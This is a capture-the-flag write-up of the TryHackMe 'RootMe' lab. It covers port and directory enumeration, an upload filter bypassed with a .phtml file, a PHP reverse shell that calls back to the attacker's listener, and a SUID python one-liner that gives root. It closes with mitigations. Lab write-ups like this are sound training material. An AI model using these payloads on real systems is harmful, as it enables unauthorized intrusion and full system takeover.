[RootMe](https://tryhackme.com/room/rrootme)

**Date:** [DD/MM/YYYY]  
**Platform:** [TryHackMe / HackTheBox / PicoCTF / Custom]  
**Difficulty:** [Easy]  
**Objective:** [Reconnaissance, getting a shell, privilege escalation, capture the flag.]

---

## Table of Contents

- [1. Summary](#1-summary)
- [2. Methodology](#2-methodology)
- [3. Reconnaissance](#3-reconnaissance)
- [4. Enumeration](#4-enumeration)
- [5. Exploitation](#5-exploitation)
- [6. Privilege Escalation](#6-privilege-escalation)
- [7. Post Exploitation](#7-post-exploitation)
- [8. Flags / Proof](#8-flags--proof)
- [9. Mitigations](#9-mitigations)
- [10. Notes](#10-notes)

---

## 1. Summary

**IP/URL:** [10.10.120.173]  
**Service/Ports:** [22/SSH, 80/HTTP]  
**Entry Point:** [Web shell upload: shell.phtml because .php wasn't accepted.]  
**Privilege Escalation:** [SUID binary]  
**Outcome:** [Root shell obtained, flags captured]  

---

## 2. Methodology

Following the PTES (Penetration Testing Execution Standard):
1. Reconnaissance  
2. Scanning & Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance

### Passive

## Active

nmap -sS -sV -sC 10.10.120.173
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

----

## 4. Enumeration
   Web: gobuster
    
Findings:
```
/uploads              (Status: 301) [Size: 316] [--> http://10.10.120.173/uploads/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.120.173/panel/]
```


----

## 5. Exploitation

   On /Panel there is an upload option to test if it is possible to upload a web shell.

   Exploit script:
```
<?php
$sock=fsockopen("10.21.***.***",4444);
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```
Set up listener:
```
nc -lvnp 4444
```

Gained Access As: www-data

----

## 6. Privilege Escalation

   Method: SUID
```
/usr/bin/python
```
    
    GTFObin:
    ```
    /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
    ```

Escalated To: root

----

## 7. Post Exploitation

Root Flag found at /root/root.txt

----

## 8. Flags / Proof

User Flag: THM{***_***_*_*****}

Root Flag: THM{********_**********}

    
        

----

## 9. Mitigations

| Vulnerability             | Risk   | Suggested Mitigation                                           |
|---------------------------|--------|-----------------------------------------------------------------|
| SUID bit from Python      | High   | chmod u-s /usr/bin/python                                       |
| Misconfigured Web Server  | High   | Strict File Type Validation; Only allow specific types          |


----

## 10. Notes

Time spent: [e.g., 30 minutes]

 Tools used: nmap, gobuster

 Lessons learned: [This CTF highlighted the critical risk of insecure file upload mechanisms, where bypassing extension filters led to remote code execution. It also reinforced the importance of auditing SUID binaries, as simple misconfigurations enabled privilege escalation to root.]
